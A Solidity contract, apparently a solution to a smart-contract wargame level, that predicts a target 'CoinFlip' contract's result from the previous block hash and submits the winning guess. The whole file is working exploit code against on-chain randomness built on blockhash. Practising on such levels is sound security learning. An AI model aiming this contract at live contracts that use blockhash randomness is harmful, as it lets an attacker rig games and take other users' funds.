// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./SafeMath.sol";

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract HackCoinFlip {
    using SafeMath for uint256;
    bool public side;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coinFlipContract;

    constructor(address _coinFlipContract) public {
      coinFlipContract = ICoinFlip(_coinFlipContract);
    }

    function hack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        side = coinFlip == 1 ? true : false;
        coinFlipContract.flip(side);
    }
}
